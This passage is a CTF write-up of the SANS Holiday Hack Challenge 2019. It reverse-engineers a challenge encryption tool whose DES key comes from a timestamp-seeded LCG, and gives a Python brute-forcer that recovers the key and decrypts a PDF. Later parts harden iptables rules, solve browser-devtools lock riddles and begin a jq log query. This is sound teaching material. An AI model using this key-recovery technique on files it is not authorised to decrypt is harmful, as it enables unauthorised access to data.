given the `elfscrow.exe </docs/sans-christmas-challenge-2019/elfscrow.exe>`__ tool, with
`debuging symbols </docs/sans-christmas-challenge-2019/elfscrow.pdb>`__. You know what
it means? It's reverse engineering time!

Before static analysis, let's launch the :code:`elfscrow.exe` tool, to see how
it works:

.. code-block:: ps1con

    PS C:\Users\root\Documents\objectif_10> .\elfscrow.exe
    Welcome to ElfScrow V1.01, the only encryption trusted by Santa!


    * WARNING: You're reading from stdin. That only partially works, use at your own risk!

    ** Please pick --encrypt or --decrypt!

    Are you encrypting a file? Try --encrypt! For example:

      C:\Users\root\Documents\objectif_10\elfscrow.exe --encrypt <infile> <outfile>

    You'll be given a secret ID. Keep it safe! The only way to get the file
    back is to use that secret ID to decrypt it, like this:

      C:\Users\root\Documents\objectif_10\elfscrow.exe --decrypt --id=<secret_id> <infile> <outfile>

    You can optionally pass --insecure to use unencrypted HTTP. But if you
    do that, you'll be vulnerable to packet sniffers such as Wireshark that
    could potentially snoop on your traffic to figure out what's going on!

So, this tool seems to be able to encrypt or decrypt documents, with the key
sent to a `trusted third party <https://en.wikipedia.org/wiki/Escrow>`__.

Let's encrypt a document, and specify the :code:`--insecure` flag, so that we
can observe network communications:

.. code-block:: ps1con
    :hl_lines: 8 10 16

    PS C:\Users\root\Documents\objectif_10> .\elfscrow.exe --insecure --encrypt .\text.txt test.enc
    Welcome to ElfScrow V1.01, the only encryption trusted by Santa!

    *** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark

    Our miniature elves are putting together random bits for your secret key!

    Seed = 1578230480

    Generated an encryption key: a0ad8f3edde93d45 (length: 8)

    Elfscrowing your key...

    Elfscrowing the key to: elfscrow.elfu.org/api/store

    Your secret id is ed662e52-a681-42c8-acf9-bee4caa4f5a8 - Santa Says, don't share that key with anybody!
    File successfully encrypted!

        ++=====================++
        ||                     ||
        ||      ELF-SCROW      ||
        ||                     ||
        ||                     ||
        ||                     ||
        ||     O               ||
        ||     |               ||
        ||     |   (O)-        ||
        ||     |               ||
        ||     |               ||
        ||                     ||
        ||                     ||
        ||                     ||
        ||                     ||
        ||                     ||
        ++=====================++

Let's take a look at the HTTP communication:

.. code-block:: http

    POST /api/store HTTP/1.1
    User-Agent: ElfScrow V1.01 (SantaBrowse Compatible)
    Host: elfscrow.elfu.org
    Content-Length: 16
    Cache-Control: no-cache

    a0ad8f3edde93d45

.. code-block:: http

    HTTP/1.1 200 OK 
    Server: nginx/1.14.2
    Date: Sun, 05 Jan 2020 14:49:04 GMT
    Content-Type: text/html;charset=utf-8
    Content-Length: 36
    Connection: keep-alive
    X-Xss-Protection: 1; mode=block
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN

    ed662e52-a681-42c8-acf9-bee4caa4f5a8

So, it seems that the tool generates an encryption key, using a seed (that
suspiciously looks like a `Unix timestamp <https://en.wikipedia.org/wiki/Unix_time>`__),
encrypts the document, and then sends the key to the elfscrow.elfu.org website,
which then gives us an id that will be used for decryption.

Let's see the decryption process:

.. code-block:: ps1con

    PS C:\Users\root\Documents\objectif_10> .\elfscrow.exe --id=ed662e52-a681-42c8-acf9-bee4caa4f5a8 --insecure --decrypt test.enc test.dec
    Welcome to ElfScrow V1.01, the only encryption trusted by Santa!

    *** WARNING: This traffic is using insecure HTTP and can be logged with tools such as Wireshark

    Let's see if we can find your key...

    Retrieving the key from: /api/retrieve

    We found your key!
    File successfully decrypted!

      +----------------------+
      |\                    /\
      | \ ________________ / |\
      |  |                |  | \
      |  | +------------+ |  |  \
      |  | |\          /| |  |   \
      |  | | \        / | |  |    \
      |  | |  \      /  | |  |     \
      |  | |   \    /   | |  |     |
      |  | |    \  /    | |  |     |
      |  | |     \/     | |  |     |
      |  | |            | |  |     |
      |  | |            | |  |     |
      |  |_|   SECRET   |_|  |     |
      | /  +------------+  \ |     |
      |/                    \|     |
      +----------------------\     |
                              \    |
                               \   |
                                \  |
                                 \ |
                                  \|
                                   |

.. code-block:: http

    POST /api/retrieve HTTP/1.1
    User-Agent: Elfscrow 1.0 (SantaBrowse Compatible)
    Host: elfscrow.elfu.org
    Content-Length: 36
    Cache-Control: no-cache

    ed662e52-a681-42c8-acf9-bee4caa4f5a8

.. code-block:: http

    HTTP/1.1 200 OK 
    Server: nginx/1.14.2
    Date: Sun, 12 Jan 2020 12:37:04 GMT
    Content-Type: text/html;charset=utf-8
    Content-Length: 16
    Connection: keep-alive
    X-Xss-Protection: 1; mode=block
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN

    a0ad8f3edde93d45

To decrypt our file, the :code:`elfscrow.exe` tool sends our secret id to the
elfscrow.elfu.org server, which sends back our encryption key.

So, how can we decrypt our PDF file? If we manage to recover the secret id, we
can ask the elfscrow.elfu.org server to send the key back. However, the secret
id seems to be fully managed by the web server, and we don't have any
information on it.

The other way would be to look at how our encryption key is generated by the
executable. This is where having the executable and the debuging symbols is
useful. Now, I first tried analyzing it using :code:`radare2`, however the
disassembling seemed weirdly incomplete. I then tried using Ghydra on Linux,
but loading PDB files is not supported on Linux. So, I then tried using Ghydra
on Windows, but I got an error trying to load the PDB file. Uuuuugh. Finally,
I fell back on Visual Studio, with a little bit on :code:`radare2` on the side.

I followed the following Microsoft documentation to debug an executable:

* `Debug an app that isn't part of a Visual Studio solution <https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-an-executable-not-part-of-a-visual-studio-solution?view=vs-2019>`__
* `Specify symbol (.pdb) and source files in the Visual Studio debugger <https://docs.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2019#configure-symbol-locations-and-loading-options>`__

Let's see the list of functions in :code:`radare2`:

.. code-block:: console
    :hl_lines: 15 16 17

    $ r2 ./elfscrow.exe 
    [0x004037f7]> idp ./elfscrow.pdb

    [0x004037f7]> aaa
    [x] Analyze all flags starting with sym. and entry0 (aa)
    [x] Analyze len bytes of instructions for references (aar)
    [x] Analyze function calls (aac)
    [x] Use -AA or aaaa to perform additional experimental analysis.
    [x] Constructing a function name for fcn.* and sym.func.* functions (aan)
    [0x004037f7]> afl
    0x00401000  104 1903 -> 1872 pdb.int___cdecl__getopt_internal_int__char_____const__char_const____struct_option_const____int____int
    0x00401770   64 1297 -> 1260 sub.s:_illegal_option_____c_770
    0x00401c90    1 35           pdb.int___cdecl_getopt_long_only_int__char_____const__char_const____struct_option_const____int
    0x00401cc0    4 203          pdb.void___cdecl_fatal_error_char
    0x00401d90    1 42           pdb.void___cdecl_super_secure_srand_int
    0x00401dc0    1 39           pdb.int___cdecl_super_secure_random_void
    0x00401df0    5 99           pdb.void___cdecl_generate_key_unsigned_char___const
    0x00401e60    1 18           fcn.00401e60
    0x00401e80    5 68           pdb.void___cdecl_to_hex_unsigned_char___const__char___const
    0x00401ed0    5 79           pdb.void___cdecl_from_hex_char___const__unsigned_char___const
    0x00401f20   25 758          pdb.void___cdecl_store_key_int__unsigned_char___const
    0x00402220    1 18           pdb.void___cdecl_retrieve_key_int__unsigned_char___const__char
    0x00402540    5 126          pdb.void___cdecl_print_hex_char____unsigned_char____unsigned_int
    0x004025c0    8 154          pdb.unsigned_char_____cdecl_read_file_char____unsigned_long_int
    0x00402660    6 103          pdb.void___cdecl_write_file_char____unsigned_char____unsigned_int
    0x004026d0    1 15           pdb.void___cdecl_do_encrypt_int__char____char
    0x00402a00    1 15           pdb.void___cdecl_do_decrypt_int__char____char____char
    0x00402d80    1 45           pdb.void___cdecl_usage_char
    0x00402db0   86 1942 -> 1943 pdb._main
    0x00403546    3 15   -> 122  pdb.___security_check_cookie_4
    0x004037f7   14 10   -> 202  entry0
    0x00403801    1 107          pdb.___report_gsfailure
    0x00403958    1 6            pdb.__amsg_exit
    0x0040395e    3 139  -> 145  pdb.__onexit
    [...]

These three functions, :code:`super_secure_srand`, :code:`super_secure_random`,
and :code:`generate_key`, seem clearly interesting.

Let's look at :code:`generate_key`:

.. code-block:: nasm
    :linenos:
    :hl_lines: 11 14 17 18 19 20 21 22 23 24 25 26 27 28 29

    00631DF0: 55                   push        ebp  
    00631DF1: 8B EC                mov         ebp,esp  
    00631DF3: 51                   push        ecx  
    00631DF4: 68 10 43 63 00       push        634310h  
    00631DF9: FF 15 CC 40 63 00    call        dword ptr [__imp____iob_func (06340CCh)]  
    00631DFF: 83 C0 40             add         eax,40h  
    00631E02: 50                   push        eax  
    00631E03: FF 15 C8 40 63 00    call        dword ptr [__imp__fprintf (06340C8h)]  
    00631E09: 83 C4 08             add         esp,8  
    00631E0C: 6A 00                push        0  
    00631E0E: E8 4D 00 00 00       call        time (0631E60h)  
    00631E13: 83 C4 04             add         esp,4  
    00631E16: 50                   push        eax  
    00631E17: E8 74 FF FF FF       call        super_secure_srand (0631D90h)  
    00631E1C: 83 C4 04             add         esp,4  
    00631E1F: C7 45 FC 00 00 00 00 mov         dword ptr [i],0  
    00631E26: EB 09                jmp         generate_key+41h (0631E31h)  
    00631E28: 8B 45 FC             mov         eax,dword ptr [i]  
    00631E2B: 83 C0 01             add         eax,1  
    00631E2E: 89 45 FC             mov         dword ptr [i],eax  
    00631E31: 83 7D FC 08          cmp         dword ptr [i],8  
    00631E35: 73 18                jae         generate_key+5Fh (0631E4Fh)  
    00631E37: E8 84 FF FF FF       call        super_secure_random (0631DC0h)  
    00631E3C: 0F B6 C8             movzx       ecx,al  
    00631E3F: 81 E1 FF 00 00 00    and         ecx,0FFh  
    00631E45: 8B 55 08             mov         edx,dword ptr [buffer]  
    00631E48: 03 55 FC             add         edx,dword ptr [i]  
    00631E4B: 88 0A                mov         byte ptr [edx],cl  
    00631E4D: EB D9                jmp         generate_key+38h (0631E28h)  
    00631E4F: 8B E5                mov         esp,ebp  
    00631E51: 5D                   pop         ebp  
    00631E52: C3                   ret

Interesting! It seems that the function calls :code:`time`, surely to
initialize the seed, as suspected. Then, the function :code:`super_secure_srand`
is called. Finally, there seems to be a loop, where the function
:code:`super_secure_random` is called (line 23), until :code:`eax` is equal to
8 (lines 20, 21, 22). If you remember the execution of the program, the
generated key has a length of 8 bytes. So, the function
:code:`super_secure_random` must be used to generate the bytes of the key, one
by one.

Let's first take a look at the :code:`super_secure_srand` function:

.. code-block:: nasm

    0x00401d90      55             push ebp
    0x00401d91      8bec           mov ebp, esp
    0x00401d93      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
    0x00401d96      50             push eax
    0x00401d97      68e8424000     push str.Seed____d          ; 0x4042e8 ; "Seed = %d\n\n"
    0x00401d9c      ff15cc404000   call dword [sym.imp.MSVCR90.dll___iob_func] ; pdb.__imp____iob_func ; 0x4040cc
    0x00401da2      83c040         add eax, 0x40               ; '@'
    0x00401da5      50             push eax
    0x00401da6      ff15c8404000   call dword [sym.imp.MSVCR90.dll_fprintf] ; pdb.__imp__fprintf ; 0x4040c8
    0x00401dac      83c40c         add esp, 0xc
    0x00401daf      8b4d08         mov ecx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
    0x00401db2      890d2c604000   mov dword [0x40602c], ecx   ; [0x40602c:4]=0
    0x00401db8      5d             pop ebp
    0x00401db9      c3             ret

It seems to only print the seed message that we saw during the execution. Now,
let's see the function :code:`super_secure_random`:

.. code-block:: nasm

    00631DC0: 55                   push        ebp  
    00631DC1: 8B EC                mov         ebp,esp  
    00631DC3: A1 2C 60 63 00       mov         eax,dword ptr [state (063602Ch)]  
    00631DC8: 69 C0 FD 43 03 00    imul        eax,eax,343FDh  
    00631DCE: 05 C3 9E 26 00       add         eax,269EC3h  
    00631DD3: A3 2C 60 63 00       mov         dword ptr [state (063602Ch)],eax  
    00631DD8: A1 2C 60 63 00       mov         eax,dword ptr [state (063602Ch)]  
    00631DDD: C1 F8 10             sar         eax,10h  
    00631DE0: 25 FF 7F 00 00       and         eax,7FFFh  
    00631DE5: 5D                   pop         ebp  
    00631DE6: C3                   ret

There seems to be a pointer to a variable :code:`state`. Here are the
operations:

1. The content of this :code:`state` variable is copied to :code:`eax`.
2. :code:`eax` is multiplied by 0x343FD, and the result is stored in
   :code:`eax`.
3. 0x269EC3 is added to :code:`eax`, and the result is stored in :code:`eax`.
4. This value is stored in the :code:`state` variable.
5. :code:`eax` is shifted by 0x10 bits to the right.
6. :code:`eax` is bit-:code:`AND`-ed with 0x7FFF.

This function is first called with the Unix timestamp as a seed, and is then
called seven more times to generate the full key. It took a bit of dynamic
analysis with Visual Studio's debugger to understand what was being done.

Here's an implementation of the key generation in python:

.. code-block:: python

    def generate_key(seed):
        key = bytearray()

        while len(key) < 8:
            seed, key_byte = super_secure_random(seed)
            key.append(key_byte & 0xFF)

        return bytes(key)

    def super_secure_random(seed):
        seed = seed & 0xFFFFFFFF

        next_seed = seed
        next_seed = (next_seed * 0x343FD) & 0xFFFFFFFF
        next_seed = (next_seed + 0x269EC3) & 0xFFFFFFFF

        key_byte = (next_seed >> 16) & 0x7FFF

        return next_seed, key_byte

The :code:`& 0xFFFFFFFF` operations are to make sure that every computation is
done on 32-bit values. Let's see if our function works. Let's use the seed in
our first encryption, :code:`1578230480`, and see if we generate the same key:

.. code-block:: pycon

    >>> seed = 1578230480
    >>> print(generate_key(seed).hex())
    a0ad8f3edde93d45

Hurray, we get the same key! Now let's try to decrypt our PDF file. But wait,
what is the encryption algorithm? Well, the encryption key is 8-byte long,
which is 56 bits (not super long). The most symetric algorithm using this key
size is `DES <https://en.wikipedia.org/wiki/Data_Encryption_Standard>`__. We
can check that by taking a look at the function :code:`do_encrypt`:

.. code-block:: nasm

    [...]
    0x0040270a      68000000f0     push 0xf0000000
    0x0040270f      6a01           push 1                      ; 1
    0x00402711      6870474000     push 0x404770               ; "Microsoft Enhanced Cryptographic Provider v1.0"
    0x00402716      6a00           push 0
    0x00402718      8d4df4         lea ecx, dword [ebp - 0xc]
    0x0040271b      51             push ecx
    0x0040271c      ff1504404000   call dword [sym.imp.ADVAPI32.dll_CryptAcquireContextA] ; pdb.__imp__CryptAcquireContextA_20 ; 0x404004
    [...]

The function `CryptAcquireContextA <https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta>`__
is called to obtain an encryption object. The cryptographic service provider
seems to be `Microsoft Enhanced Cryptographic Provider v1.0 <https://docs.microsoft.com/en-us/windows/win32/seccrypto/microsoft-enhanced-cryptographic-provider>`__,
which does seem to use DES as an encryption algorithm.

Now, DES is a `block cipher <https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation>`__,
and several mode can be used. I first tried ECB on some test files, but it
didn't seem to work: only the first block seemed correctly decrypted. This
seems to indicate that the used mode is CBC, with an initialization vector
full of null bytes.

Now that we have everything, let's try to decrypt our PDF file:

.. code-block:: python

    #!/usr/bin/env python3

    import sys
    import datetime

    from Crypto.Cipher import DES

    def generate_key(seed):
        key = bytearray()

        while len(key) < 8:
            seed, key_byte = super_secure_random(seed)
            key.append(key_byte & 0xFF)

        return bytes(key)

    def super_secure_random(seed):
        seed = seed & 0xFFFFFFFF

        next_seed = seed
        next_seed = (next_seed * 0x343FD) & 0xFFFFFFFF
        next_seed = (next_seed + 0x269EC3) & 0xFFFFFFFF

        key_byte = (next_seed >> 16) & 0x7FFF

        return next_seed, key_byte

    def decrypt_file(data, key):
        decryptor = DES.new(key, mode=DES.MODE_CBC, IV=b'\x00\x00\x00\x00\x00\x00\x00\x00')

        plain_text = decryptor.decrypt(data)

        return plain_text

    def main():
        if len(sys.argv) != 2:
            print('usage: {} <file_to_decrypt>'.format(sys.argv[0]))
            return -1

        encrypted_file_name = sys.argv[1]
        with open(encrypted_file_name, 'rb') as f:
            data = f.read()

        # We know the file was encrypted on December 6, 2019, between 7pm and 9pm UTC
        initial_time = datetime.datetime(2019, 12, 6, 19, 00, 00, tzinfo=datetime.timezone.utc)
        end_time = datetime.datetime(2019, 12, 6, 21, 00, 00, tzinfo=datetime.timezone.utc)

        min_seed = int(initial_time.timestamp())
        max_seed = int(end_time.timestamp())

        while min_seed <= max_seed:
            key_candidate = generate_key(min_seed)
            decrypted_file = decrypt_file(data, key_candidate)
            # We know the file is a PDF, so we look for the beginning of a PDF
            # file. If the decrypted data starts with "%PDF", we must have
            # found the correct key.
            if decrypted_file.startswith(b'%PDF'):
                decrypted_file_name = './{}_{}'.format(key_candidate.hex(), encrypted_file_name)
                with open(decrypted_file_name, 'wb') as f:
                    f.write(decrypted_file)

                print('[+] We managed to decrypt the file')
                print('[*] Initial seed: {}'.format(min_seed))
                print('[*] Encryption key: {}'.format(key_candidate.hex()))
                print('[+] Decrypted file saved under {}'.format(decrypted_file_name))
                break
            min_seed += 1

    if __name__ == '__main__':
        main()

Let's launch our script:

.. code-block:: console

    $ ./decrypt_file.py ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc
    [+] We managed to decrypt the file
    [*] Initial seed: 1575663650
    [*] Encryption key: b5ad6a321240fbec
    [+] Decrypted file saved under ./b5ad6a321240fbec_ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc

Yay! We managed to decrypt the file. You can download it `here </docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf>`__.
It seems to be a quick start guide for Santa's Super Sled-O-Matic Machine
Learning Sleigh Route Finder, which seems to be a device mounted on Santa's
sled to help him find his route for his delivery.

Objective 11: 
~~~~~~~~~~~~~
Kent Tinseltooth's Cranberry Pi Challenge
-----------------------------------------

We arrive on Kent having an internal monologue. Apparently his IoT braces were
hacked:

.. code-block:: console

    Inner Voice: Kent. Kent. Wake up, Kent.
    Inner Voice: I'm talking to you, Kent.
    Kent TinselTooth: Who said that? I must be going insane.
    Kent TinselTooth: Am I?
    Inner Voice: That remains to be seen, Kent. But we are having a conversation.
    Inner Voice: This is Santa, Kent, and you've been a very naughty boy.
    Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?
    Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.
    Kent TinselTooth: Oh, sure.
    Inner Voice: Cut the candy, Kent, you've built an automated, machine-learning, sleigh device.
    Kent TinselTooth: How did you know that?
    Inner Voice: I'm Santa - I know everything.
    Kent TinselTooth: Oh. Kringle. *sigh*
    Inner Voice: That's right, Kent. Where is the sleigh device now?
    Kent TinselTooth: I can't tell you.
    Inner Voice: How would you like to intern for the rest of time?
    Kent TinselTooth: Please no, they're testing it at srf.elfu.org using default creds, but I don't know more. It's classified.
    Inner Voice: Very good Kent, that's all I needed to know.
    Kent TinselTooth: I thought you knew everything?
    Inner Voice: Nevermind that. I want you to think about what you've researched and studied. From now on, stop playing with your teeth, and floss more.
    *Inner Voice Goes Silent*

    Kent TinselTooth: Oh no, I sure hope that voice was Santa's.
    Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.
    Kent TinselTooth: I must have forgotten to configure the firewall...
    Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.
    Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.
    elfuuser@54cbc0276e93:~$

He needs our help to harden the firewall rules for his braces, even though he
was super rude during our Splunk experiment! Let's take a look at the rules he
needs implemented:

.. code-block:: console

    elfuuser@54cbc0276e93:~$ cat /home/elfuuser/IOTteethBraces.md

::

    # ElfU Research Labs - Smart Braces
    ### A Lightweight Linux Device for Teeth Braces
    ### Imagined and Created by ElfU Student Kent TinselTooth

    This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose.

    ## Proper Firewall configuration:

    The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:

    ```
    sudo iptables -P FORWARD DROP
    ```

    The following is an example of allowing traffic from a specific IP and to a specific port:

    ```
    sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT
    ```

    A proper configuration for the Smart Braces should be exactly:

    1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
    2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
    3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
    4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
    5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
    6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.

Let's take care of the first rule, setting the default policies to :code:`DROP`
for the three mentioned chains:

.. code-block:: console

    elfuuser@54cbc0276e93:~$ sudo iptables -P INPUT DROP
    elfuuser@54cbc0276e93:~$ sudo iptables -P FORWARD DROP
    elfuuser@54cbc0276e93:~$ sudo iptables -P OUTPUT DROP

On to the second rule. We must accept already established incoming and outgoing
connections:

.. code-block:: console

    elfuuser@e57e7cd77272:~$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    elfuuser@e57e7cd77272:~$ sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

For the third rule, we must restrict input connections. To be more specific,
only the IP address :code:`172.19.0.225` is allowed to access the local SSH
server on TCP port 22:

.. code-block:: console

    elfuuser@e57e7cd77272:~$ sudo iptables -A INPUT -s 172.19.0.225/32 -p tcp --dport 22 -j ACCEPT

The fourth rule also concerns incoming connections. However, the rule is a bit
more permissive: anyone can connect to the TCP port 21 and 80:

.. code-block:: console

    elfuuser@e57e7cd77272:~$ sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
    elfuuser@e57e7cd77272:~$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

The fifth rule concerns outgoing traffic: we must allow every connection to
external TCP port 80:

.. code-block:: console

    elfuuser@e57e7cd77272:~$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT

Finally, any incoming connection from the loopback :code:`lo` connection is
authorized:

.. code-block:: console

    elfuuser@e57e7cd77272:~$ sudo iptables -A INPUT -i lo -j ACCEPT

Once we have done everything, Kent thanks us:

::

    Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!

Open the Sleigh Shop Door
-------------------------

We must try to get access to the Sleigh Shop. The door is garded by Shiny
Upatree.

.. image:: /images/sans-christmas-challenge-2019/shiny_upatree.png
    :alt: shiny_upatree.png
    :align: center

*Shiny Upatree says*

    Psst - hey!

    I'm Shinny Upatree, and I know what's going on!

    Yeah, that's right - guarding the sleigh shop has made me privvy to some
    serious, high-level intel.

    In fact, I know WHO is causing all the trouble.

    Cindy? Oh no no, not that who. And stop guessing - you'll never figure it
    out.

    The only way you could would be if you could break into `my crate <https://crate.elfu.org/>`__,
    here.

    You see, I've written the villain's name down on a piece of paper and
    hidden it away securely!

So, we must try to break into `Shiny's crate <https://crate.elfu.org/>`__. It
seems to be locked with several locks, and we have to solve riddles to find the
codes to unlock them.

It's important to notice that the codes change every time we reload the page,
and every lock must be unlocked in one go. So be careful if you reload the
page, or perform an action that would reload the page (like displaying the
source code via :code:`Ctrl+U`).

Let's go:

1. You don't need a clever riddle to open the console and scroll a little.

So, let's open the browser console, in the developer tools, and scroll to the
top:

.. image:: /images/sans-christmas-challenge-2019/lock_1_console.png
    :alt: lock_1_console.png
    :align: center

We get our first code: :code:`AF1XO1BQ`.

2. Some codes are hard to spy, perhaps they'll show up on pulp with dye?

Hmmm, what? I didn't understand anything, so I took a look at the hints:

* Most paper is made out of pulp.
* How can you view this page on paper?

We can view this page, by printing it! Let's try to print it to a PDF file:

.. image:: /images/sans-christmas-challenge-2019/lock_2_print.png
    :alt: lock_2_print.png
    :align: center

We get our next code: :code:`17OT8MUP`.

3. This code is still unknown; it was fetched but never shown.

Hmm, the riddle seems to imply that the code was downloaded by the browser.
Let's see in our browser network tab:

.. image:: /images/sans-christmas-challenge-2019/lock_3_fetch.png
    :alt: lock_3_fetch.png
    :align: center

We get our next code: :code:`NZ50BMID`.

4. Where might we keep the things we forage? Yes, of course: Local barrels!

The riddle seems to hint to taking a look at the local storage:

.. image:: /images/sans-christmas-challenge-2019/lock_4_local_storage.png
    :alt: lock_4_local_storage.png
    :align: center

We get our next code: :code:`TBM5L28P`.

5. Did you notice the code in the title? It may very well prove vital.

We look at the title in the browser's window name:

.. image:: /images/sans-christmas-challenge-2019/lock_5_browser_title.png
    :alt: lock_5_browser_title.png
    :align: center

We get our next code: :code:`QWSJCUG9`.

6. In order for this hologram to be effective, it may be necessary to increase
   your perspective.

I didn't understand the riddle, so let's take a look at a hint:

* :code:`perspective` is a css property.

Alright, let's take a look at the :code:`perspective` attribute of the image
next to the lock:

.. code-block:: css

    .hologram {
        perspective: 15px;
        width: 150px;
        height: 100px;
        border-radius: 20px;
        transition: perspective 5s;
    }

Let's increase the :code:`perspective` attribute:

.. code-block:: css

    .hologram {
        perspective: 9000px;
        width: 150px;
        height: 100px;
        border-radius: 20px;
        transition: perspective 5s;
    }

.. image:: /images/sans-christmas-challenge-2019/lock_6_hologram.png
    :alt: lock_6_hologram.png
    :align: center

We can make out the code: :code:`6O0X1TVU`.

7. The font you're seeing is pretty slick, but this lock's code was my first
   pick.

Let's look at the font attributes in the CSS of the page:

.. code-block:: css

    .instructions {
     font-family: '1SWUSZZ2', 'Beth Ellen', cursive;
    }

We get the following code: :code:`1SWUSZZ2`.

8. In the event that the .eggs go bad, you must figure out who will be sad.

Let's see what event is linked to this :code:`.eggs` object:

.. image:: /images/sans-christmas-challenge-2019/lock_8_event.png
    :alt: lock_8_event.png
    :align: center

The code is :code:`VERONICA`.

9. This next code will be unredacted, but only when all the chakras are
   :active.

:code:`:active` is a CSS attribute, let's look for :code:`chakra` in the CSS:

.. code-block:: css

    span.chakra:nth-child(1):active:after {
      content: '77';
    }
    span.chakra:nth-child(2):active:after {
      content: 'QS';
    }
    span.chakra:nth-child(3):active:after {
      content: 'X';
    }
    span.chakra:nth-child(4):active:after {
      content: 'HI';
    }
    span.chakra:nth-child(5):active:after {
      content: '9';
    }

We get the next code: :code:`77QSXHI9`.

10. Oh, no! This lock's out of commission! Pop off the cover and locate what's
    missing.

Come again? Let's look at the hint:

* Use the DOM tree viewer to examine this lock. you can search for items in the
  DOM using this view.
* You can click and drag elements to reposition them in the DOM tree.

Alright, let's use the DOM tree to remove the cover, by dragging and dropping
the cover element:

.. image:: /images/sans-christmas-challenge-2019/lock_10_no_cover.png
    :alt: lock_10_no_cover.png
    :align: center

There seems to be a code printed on the PCB: :code:`KD29XJ37`. But there seems
to be missing three elements on the PCB. If we look around the CSS file, we
see that three elements are linked to the lock #10 :code:`c10`.

.. code-block:: css

    .locks > li > .lock.c10 > .component.macaroni {
      background: url(../../images/mac.png) no-repeat;
    }

    .locks > li > .lock.c10 > .component.swab {
      background: url(../../images/qtip.png) no-repeat;
    }

    .locks > li > .lock.c10 > .component.gnome {
      background: url(../../images/gnome.png) no-repeat;
    }

Let's look for these elements, :code:`macaroni`, :code:`swab`, and
:code:`gnome`, and drag and drop them on the PCB:

.. image:: /images/sans-christmas-challenge-2019/lock_10_elements.png
    :alt: lock_10_elements.png
    :align: center

Now, let's input the code, and unlock the final lock, opening the crate:

.. image:: /images/sans-christmas-challenge-2019/crate_open.png
    :alt: crate_open.png
    :align: center

The villain is the Tooth Fairy **gasp**.

Objective 12: 
~~~~~~~~~~~~~
Wunorse Openslae's Cranberry Pi Challenge
-----------------------------------------

.. code-block:: console

    Some JSON files can get quite busy.
    There's lots to see and do.
    Does C&C lurk in our data?
    JQ's the tool for you!

    -Wunorse Openslae

    Identify the destination IP address with the longest connection duration
    using the supplied Zeek logfile. Run runtoanswer to submit your answer.

    elf@a71d36bc6488:~$

Alright, we must look for the connection with the longest duration. Let's take
a look at this log file:

.. code-block:: console

    elf@a71d36bc6488:~$ ls
    conn.log
    elf@94a92f24ac33:~$ head -n 3 conn.log
    {"ts":"2019-04-04T20:34:24.698965Z","uid":"CAFvAu2l50Km67tSP5","id.orig_h":"192.168.144.130","id.orig_p":64277,"id.resp_h":"192.168.144.2","id.resp_p":53,"proto":"udp","service":"dns","duration":0.320463,"orig_bytes":94,"resp_bytes":316,"conn_state":"SF","missed_bytes":0,"history":"Dd","orig_pkts":2,"orig_ip_bytes":150,"resp_pkts":2,"resp_ip_bytes":372}
    {"ts":"2019-04-04T20:41:01.862738Z","uid":"CCuAk24L1kIclVKz4l","id.orig_h":"192.168.144.130","id.orig_p":55106,"id.resp_h":"192.168.144.2","id.resp_p":53,"proto":"udp","service":"dns","duration":0.000602,"orig_bytes":47,"resp_bytes":63,"conn_state":"SF","missed_bytes":0,"history":"Dd","orig_pkts":1,"orig_ip_bytes":75,"resp_pkts":1,"resp_ip_bytes":91}
    {"ts":"2019-04-04T20:42:09.277476Z","uid":"CRRCaj4bvzUJRRpmR6","id.orig_h":"192.168.144.130","id.orig_p":59679,"id.resp_h":"192.168.144.2","id.resp_p":53,"proto":"udp","service":"dns","duration":0.000923,"orig_bytes":34,"resp_bytes":34,"conn_state":"SF","missed_bytes":0,"history":"Dd","orig_pkts":1,"orig_ip_bytes":62,"resp_pkts":1,"resp_ip_bytes":62}

So, the :code:`conn.log` file is full of JSON data, one object per line, which
has the following interesting attributes:

* :code:`id.resp_h`, the destination IP
* :code:`duration`, the duration of the connection

As the console suggests, we can use :code:`jq` to parse this data. Let's create
a :code:`jq` filter that will give us the destination IP with the longest
connection duration. You can use `this guide <https://stedolan.github.io/jq/manual/>`__
to create your own filter.

.. code-block:: console

    elf@94a92f24ac33:~$ jq -s '[.[] | {duration, "id.resp_h"}] | sort_by(.duration) | .[-1]."id.resp_h"' conn.log

Let's break this down:

::

    jq -s [...] conn.log

This calls :code:`jq` and tells it to treat the data in :code:`conn.log` as a
stream of data (since we have one JSON object per line, and not, say, a full
JSON object in the file).

::

